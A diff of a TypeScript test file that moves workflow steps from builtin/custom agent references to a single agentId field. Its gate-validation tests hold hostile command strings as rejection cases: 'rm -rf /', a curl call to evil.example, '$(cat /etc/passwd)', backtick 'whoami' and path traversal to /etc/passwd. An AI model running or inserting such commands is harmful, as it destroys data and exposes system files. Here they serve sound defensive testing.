@@ -7,8 +7,7 @@
  * - Repository: JSON round-trips (rules, tags, gates)
  * - Manager: name uniqueness within space
  * - Manager: at-least-one-step validation
- * - Manager: builtin agent ref validation (planner/coder/general valid, 'leader' rejected)
- * - Manager: custom agent ref validation via SpaceAgentLookup
+ * - Manager: agentId validation (non-empty, optional SpaceAgentLookup)
  * - Manager: gate command validation (quality_check allowlist, custom relative path, no ..)
  * - Manager: timeoutMs bounds (0–300000)
  * - Manager: step ordering via array position
@@ -56,17 +55,11 @@ function seedAgent(db: BunDatabase, agentId: string, spaceId: string, name: stri
 	).run(agentId, spaceId, name, Date.now(), Date.now());
 }
 
-const coderStep: WorkflowStepInput = { name: 'Code', agentRefType: 'builtin', agentRef: 'coder' };
-const plannerStep: WorkflowStepInput = {
-	name: 'Plan',
-	agentRefType: 'builtin',
-	agentRef: 'planner',
-};
-const generalStep: WorkflowStepInput = {
-	name: 'Review',
-	agentRefType: 'builtin',
-	agentRef: 'general',
-};
+// Arbitrary IDs — tests that use these fixtures construct the manager with agentLookup: null
+// so no DB lookup is performed and these IDs do not need to exist in the test database.
+const coderStep: WorkflowStepInput = { name: 'Code', agentId: 'agent-coder' };
+const plannerStep: WorkflowStepInput = { name: 'Plan', agentId: 'agent-planner' };
+const generalStep: WorkflowStepInput = { name: 'Review', agentId: 'agent-general' };
 
 // ---------------------------------------------------------------------------
 // Setup
@@ -113,8 +106,7 @@ describe('SpaceWorkflowRepository', () => {
 		expect(wf.steps).toHaveLength(2);
 		expect(wf.steps[0].name).toBe('Code');
 		expect(wf.steps[0].order).toBe(0);
-		expect(wf.steps[0].agentRefType).toBe('builtin');
-		expect(wf.steps[0].agentRef).toBe('coder');
+		expect(wf.steps[0].agentId).toBe('agent-coder');
 		expect(wf.steps[1].order).toBe(1);
 		expect(wf.tags).toEqual([]);
 		expect(wf.rules).toEqual([]);
@@ -182,7 +174,7 @@ describe('SpaceWorkflowRepository', () => {
 		// Small delay to ensure timestamp difference
 		await new Promise((r) => setTimeout(r, 2));
 		const updated = repo.updateWorkflow(wf.id, {
-			steps: [{ id: 'x', order: 0, name: 'Plan', agentRefType: 'builtin', agentRef: 'planner' }],
+			steps: [{ id: 'x', order: 0, name: 'Plan', agentId: 'agent-planner' }],
 		});
 		expect(updated?.updatedAt).toBeGreaterThan(before);
 	});
@@ -196,12 +188,10 @@ describe('SpaceWorkflowRepository', () => {
 		expect(wf.steps).toHaveLength(2);
 
 		const updated = repo.updateWorkflow(wf.id, {
-			steps: [
-				{ id: 'ignored', order: 0, name: 'Review', agentRefType: 'builtin', agentRef: 'general' },
-			],
+			steps: [{ id: 'ignored', order: 0, name: 'Review', agentId: 'agent-general' }],
 		});
 		expect(updated?.steps).toHaveLength(1);
-		expect(updated?.steps[0].agentRef).toBe('general');
+		expect(updated?.steps[0].agentId).toBe('agent-general');
 	});
 
 	test('updateWorkflow returns null for missing id', () => {
@@ -226,12 +216,12 @@ describe('SpaceWorkflowRepository', () => {
 	// getWorkflowsReferencingAgent
 	// -------------------------------------------------------------------------
 
-	test('getWorkflowsReferencingAgent returns workflows with matching custom agent', () => {
+	test('getWorkflowsReferencingAgent returns workflows with matching agent', () => {
 		seedAgent(db, 'agent-1', 'space-1', 'Alpha');
 		const wf = repo.createWorkflow({
 			spaceId: 'space-1',
-			name: 'WF With Custom',
-			steps: [{ name: 'Step', agentRefType: 'custom', agentRef: 'agent-1' }],
+			name: 'WF With Agent',
+			steps: [{ name: 'Step', agentId: 'agent-1' }],
 		});
 		const results = repo.getWorkflowsReferencingAgent('agent-1');
 		expect(results).toHaveLength(1);
@@ -245,15 +235,6 @@ describe('SpaceWorkflowRepository', () => {
 			steps: [coderStep],
 		});
 		expect(repo.getWorkflowsReferencingAgent('no-such-agent')).toHaveLength(0);
-	});
-
-	test('getWorkflowsReferencingAgent ignores builtin steps', () => {
-		repo.createWorkflow({
-			spaceId: 'space-1',
-			name: 'WF Builtin',
-			steps: [coderStep, plannerStep],
-		});
-		expect(repo.getWorkflowsReferencingAgent('coder')).toHaveLength(0);
 	});
 
 	// -------------------------------------------------------------------------
@@ -270,8 +251,7 @@ describe('SpaceWorkflowRepository', () => {
 		};
 		const step: WorkflowStepInput = {
 			name: 'Code',
-			agentRefType: 'builtin',
-			agentRef: 'coder',
+			agentId: 'agent-coder',
 			entryGate: entry,
 			exitGate: exit,
 			instructions: 'Write clean code',
@@ -306,16 +286,15 @@ describe('SpaceWorkflowRepository', () => {
 		expect(fetched.rules[1].appliesTo).toBeUndefined();
 	});
 
-	test('JSON round-trip: custom step stores agentRef as agent_id', () => {
+	test('JSON round-trip: agentId is stored in agent_id column and round-trips', () => {
 		seedAgent(db, 'agent-99', 'space-1', 'MyAgent');
 		const wf = repo.createWorkflow({
 			spaceId: 'space-1',
 			name: 'Custom WF',
-			steps: [{ name: 'Custom Step', agentRefType: 'custom', agentRef: 'agent-99' }],
+			steps: [{ name: 'Step', agentId: 'agent-99' }],
 		});
 		const fetched = repo.getWorkflow(wf.id)!;
-		expect(fetched.steps[0].agentRefType).toBe('custom');
-		expect(fetched.steps[0].agentRef).toBe('agent-99');
+		expect(fetched.steps[0].agentId).toBe('agent-99');
 
 		// Verify agent_id column is set
 		const row = db
@@ -434,57 +413,39 @@ describe('SpaceWorkflowManager', () => {
 	});
 
 	// -------------------------------------------------------------------------
-	// Agent ref validation — builtins
+	// Agent ID validation
 	// -------------------------------------------------------------------------
 
-	test('createWorkflow accepts all valid builtin roles', () => {
-		for (const role of ['planner', 'coder', 'general'] as const) {
-			const wf = manager.createWorkflow({
-				spaceId: 'space-1',
-				name: `WF-${role}`,
-				steps: [{ name: 'Step', agentRefType: 'builtin', agentRef: role }],
-			});
-			expect(wf.steps[0].agentRef).toBe(role);
-		}
+	test('createWorkflow accepts any non-empty agentId (no lookup)', () => {
+		const wf = manager.createWorkflow({
+			spaceId: 'space-1',
+			name: 'WF',
+			steps: [{ name: 'Step', agentId: 'some-uuid' }],
+		});
+		expect(wf.steps[0].agentId).toBe('some-uuid');
 	});
 
-	test('createWorkflow rejects leader as builtin agentRef', () => {
+	test('createWorkflow rejects empty agentId', () => {
 		expect(() =>
 			manager.createWorkflow({
 				spaceId: 'space-1',
-				name: 'Leader WF',
-				steps: [
-					{
-						name: 'Step',
-						agentRefType: 'builtin',
-						agentRef: 'leader' as unknown as 'planner',
-					},
-				],
+				name: 'Bad AgentId',
+				steps: [{ name: 'Step', agentId: '' }],
 			})
 		).toThrow(WorkflowValidationError);
 	});
 
-	test('createWorkflow rejects unknown builtin agentRef', () => {
+	test('createWorkflow rejects whitespace-only agentId', () => {
 		expect(() =>
 			manager.createWorkflow({
 				spaceId: 'space-1',
-				name: 'Bad Builtin WF',
-				steps: [
-					{
-						name: 'Step',
-						agentRefType: 'builtin',
-						agentRef: 'executor' as unknown as 'planner',
-					},
-				],
+				name: 'Whitespace AgentId',
+				steps: [{ name: 'Step', agentId: '   ' }],
 			})
 		).toThrow(WorkflowValidationError);
 	});
 
-	// -------------------------------------------------------------------------
-	// Agent ref validation — custom (via SpaceAgentLookup)
-	// -------------------------------------------------------------------------
-
-	test('createWorkflow accepts custom ref when agent exists', () => {
+	test('createWorkflow accepts agentId when agent exists in lookup', () => {
 		seedAgent(db, 'agent-1', 'space-1', 'MyAgent');
 		const lookup: SpaceAgentLookup = {
 			getAgentById: (_spaceId, id) =>
@@ -494,12 +455,12 @@ describe('SpaceWorkflowManager', () => {
 		const wf = mgr.createWorkflow({
 			spaceId: 'space-1',
 			name: 'Custom WF',
-			steps: [{ name: 'Step', agentRefType: 'custom', agentRef: 'agent-1' }],
+			steps: [{ name: 'Step', agentId: 'agent-1' }],
 		});
-		expect(wf.steps[0].agentRef).toBe('agent-1');
+		expect(wf.steps[0].agentId).toBe('agent-1');
 	});
 
-	test('createWorkflow rejects custom ref when agent does not exist', () => {
+	test('createWorkflow rejects agentId when agent does not exist in lookup', () => {
 		const lookup: SpaceAgentLookup = {
 			getAgentById: () => null,
 		};
@@ -507,29 +468,28 @@ describe('SpaceWorkflowManager', () => {
 		expect(() =>
 			mgr.createWorkflow({
 				spaceId: 'space-1',
-				name: 'Bad Custom',
-				steps: [{ name: 'Step', agentRefType: 'custom', agentRef: 'non-existent-uuid' }],
+				name: 'Bad Agent',
+				steps: [{ name: 'Step', agentId: 'non-existent-uuid' }],
 			})
 		).toThrow(WorkflowValidationError);
 	});
 
-	test('createWorkflow accepts custom ref when no lookup provided (no validation)', () => {
-		// Without agentLookup, custom refs are accepted as-is
+	test('createWorkflow skips lookup when agentLookup is null', () => {
+		// Without agentLookup, any non-empty agentId is accepted
 		const wf = manager.createWorkflow({
 			spaceId: 'space-1',
 			name: 'No-Lookup WF',
-			steps: [{ name: 'Step', agentRefType: 'custom', agentRef: 'anything' }],
+			steps: [{ name: 'Step', agentId: 'anything' }],
 		});
-		expect(wf.steps[0].agentRef).toBe('anything');
+		expect(wf.steps[0].agentId).toBe('anything');
 	});
 
-	test('createWorkflow rejects empty custom agentRef', () => {
+	test('updateWorkflow rejects invalid agentId via lookup', () => {
+		const wf = manager.createWorkflow({ spaceId: 'space-1', name: 'WF', steps: [coderStep] });
+		const lookup: SpaceAgentLookup = { getAgentById: () => null };
+		const mgr = new SpaceWorkflowManager(repo, lookup);
 		expect(() =>
-			manager.createWorkflow({
-				spaceId: 'space-1',
-				name: 'Empty Ref',
-				steps: [{ name: 'Step', agentRefType: 'custom', agentRef: '' }],
-			})
+			mgr.updateWorkflow(wf.id, { steps: [{ name: 'Step', agentId: 'non-existent' }] })
 		).toThrow(WorkflowValidationError);
 	});
 
@@ -546,8 +506,7 @@ describe('SpaceWorkflowManager', () => {
 				steps: [
 					{
 						name: 'Step',
-						agentRefType: 'builtin',
-						agentRef: 'coder',
+						agentId: 'agent-coder',
 						exitGate: { type: 'quality_check', command: cmd },
 					},
 				],
@@ -564,8 +523,7 @@ describe('SpaceWorkflowManager', () => {
 				steps: [
 					{
 						name: 'Step',
-						agentRefType: 'builtin',
-						agentRef: 'coder',
+						agentId: 'agent-coder',
 						exitGate: { type: 'quality_check', command: 'rm -rf /' },
 					},
 				],
@@ -581,8 +539,7 @@ describe('SpaceWorkflowManager', () => {
 				steps: [
 					{
 						name: 'Step',
-						agentRefType: 'builtin',
-						agentRef: 'coder',
+						agentId: 'agent-coder',
 						exitGate: { type: 'quality_check' },
 					},
 				],
@@ -598,8 +555,7 @@ describe('SpaceWorkflowManager', () => {
 				steps: [
 					{
 						name: 'Step',
-						agentRefType: 'builtin',
-						agentRef: 'coder',
+						agentId: 'agent-coder',
 						exitGate: { type: 'quality_check', command: 'bun test; rm -rf /' },
 					},
 				],
@@ -615,8 +571,7 @@ describe('SpaceWorkflowManager', () => {
 				steps: [
 					{
 						name: 'Step',
-						agentRefType: 'builtin',
-						agentRef: 'coder',
+						agentId: 'agent-coder',
 						exitGate: { type: 'quality_check', command: 'bun test && curl http://evil.example' },
 					},
 				],
@@ -632,8 +587,7 @@ describe('SpaceWorkflowManager', () => {
 				steps: [
 					{
 						name: 'Step',
-						agentRefType: 'builtin',
-						agentRef: 'coder',
+						agentId: 'agent-coder',
 						exitGate: { type: 'quality_check', command: 'bun test $(cat /etc/passwd)' },
 					},
 				],
@@ -652,8 +606,7 @@ describe('SpaceWorkflowManager', () => {
 			steps: [
 				{
 					name: 'Step',
-					agentRefType: 'builtin',
-					agentRef: 'coder',
+					agentId: 'agent-coder',
 					exitGate: { type: 'custom', command: './scripts/verify.sh' },
 				},
 			],
@@ -669,8 +622,7 @@ describe('SpaceWorkflowManager', () => {
 				steps: [
 					{
 						name: 'Step',
-						agentRefType: 'builtin',
-						agentRef: 'coder',
+						agentId: 'agent-coder',
 						exitGate: { type: 'custom', command: '/etc/passwd' },
 					},
 				],
@@ -686,8 +638,7 @@ describe('SpaceWorkflowManager', () => {
 				steps: [
 					{
 						name: 'Step',
-						agentRefType: 'builtin',
-						agentRef: 'coder',
+						agentId: 'agent-coder',
 						exitGate: { type: 'custom', command: './scripts/../../../etc/passwd' },
 					},
 				],
@@ -703,8 +654,7 @@ describe('SpaceWorkflowManager', () => {
 				steps: [
 					{
 						name: 'Step',
-						agentRefType: 'builtin',
-						agentRef: 'coder',
+						agentId: 'agent-coder',
 						exitGate: { type: 'custom', command: 'scripts/verify.sh' },
 					},
 				],
@@ -720,8 +670,7 @@ describe('SpaceWorkflowManager', () => {
 				steps: [
 					{
 						name: 'Step',
-						agentRefType: 'builtin',
-						agentRef: 'coder',
+						agentId: 'agent-coder',
 						exitGate: { type: 'custom' },
 					},
 				],
@@ -737,8 +686,7 @@ describe('SpaceWorkflowManager', () => {
 				steps: [
 					{
 						name: 'Step',
-						agentRefType: 'builtin',
-						agentRef: 'coder',
+						agentId: 'agent-coder',
 						exitGate: { type: 'custom', command: './scripts/verify.sh; rm -rf /' },
 					},
 				],
@@ -754,8 +702,7 @@ describe('SpaceWorkflowManager', () => {
 				steps: [
 					{
 						name: 'Step',
-						agentRefType: 'builtin',
-						agentRef: 'coder',
+						agentId: 'agent-coder',
 						exitGate: { type: 'custom', command: './scripts/verify.sh | cat /etc/passwd' },
 					},
 				],
@@ -771,8 +718,7 @@ describe('SpaceWorkflowManager', () => {
 				steps: [
 					{
 						name: 'Step',
-						agentRefType: 'builtin',
-						agentRef: 'coder',
+						agentId: 'agent-coder',
 						exitGate: { type: 'custom', command: './scripts/verify.sh `whoami`' },
 					},
 				],
@@ -788,8 +734,7 @@ describe('SpaceWorkflowManager', () => {
 				steps: [
 					{
 						name: 'Step',
-						agentRefType: 'builtin',
-						agentRef: 'coder',
+						agentId: 'agent-coder',
 						exitGate: { type: 'quality_check', command: 'bun test\nrm -rf /' },
 					},
 				],
@@ -805,8 +750,7 @@ describe('SpaceWorkflowManager', () => {
 				steps: [
 					{
 						name: 'Step',
-						agentRefType: 'builtin',
-						agentRef: 'coder',
+						agentId: 'agent-coder',
 						exitGate: { type: 'custom', command: './scripts/verify.sh\nrm -rf /' },
 					},
 				],
@@ -825,8 +769,7 @@ describe('SpaceWorkflowManager', () => {
 			steps: [
 				{
 					name: 'Step',
-					agentRefType: 'builtin',
-					agentRef: 'coder',
+					agentId: 'agent-coder',
 					exitGate: { type: 'human_approval', timeoutMs: 0 },
 				},
 			],
@@ -841,8 +784,7 @@ describe('SpaceWorkflowManager', () => {
 			steps: [
 				{
 					name: 'Step',
-					agentRefType: 'builtin',
-					agentRef: 'coder',
+					agentId: 'agent-coder',
 					exitGate: { type: 'human_approval', timeoutMs: 300_000 },
 				},
 			],
@@ -858,8 +800,7 @@ describe('SpaceWorkflowManager', () => {
 				steps: [
 					{
 						name: 'Step',
-						agentRefType: 'builtin',
-						agentRef: 'coder',
+						agentId: 'agent-coder',
 						exitGate: { type: 'human_approval', timeoutMs: 300_001 },
 					},
 				],
@@ -875,8 +816,7 @@ describe('SpaceWorkflowManager', () => {
 				steps: [
 					{
 						name: 'Step',
-						agentRefType: 'builtin',
-						agentRef: 'coder',
+						agentId: 'agent-coder',
 						exitGate: { type: 'human_approval', timeoutMs: -1 },
 					},
 				],
@@ -916,16 +856,16 @@ describe('SpaceWorkflowManager', () => {
 	// getWorkflowsReferencingAgent
 	// -------------------------------------------------------------------------
 
-	test('getWorkflowsReferencingAgent returns workflows using custom agent', () => {
+	test('getWorkflowsReferencingAgent returns workflows using given agent', () => {
 		seedAgent(db, 'agent-1', 'space-1', 'Alpha');
 		const wf = manager.createWorkflow({
 			spaceId: 'space-1',
 			name: 'Uses Alpha',
-			steps: [{ name: 'Step', agentRefType: 'custom', agentRef: 'agent-1' }],
+			steps: [{ name: 'Step', agentId: 'agent-1' }],
 		});
 		manager.createWorkflow({
 			spaceId: 'space-1',
-			name: 'Uses Builtin',
+			name: 'Uses Other',
 			steps: [coderStep],
 		});
 		const refs = manager.getWorkflowsReferencingAgent('agent-1');
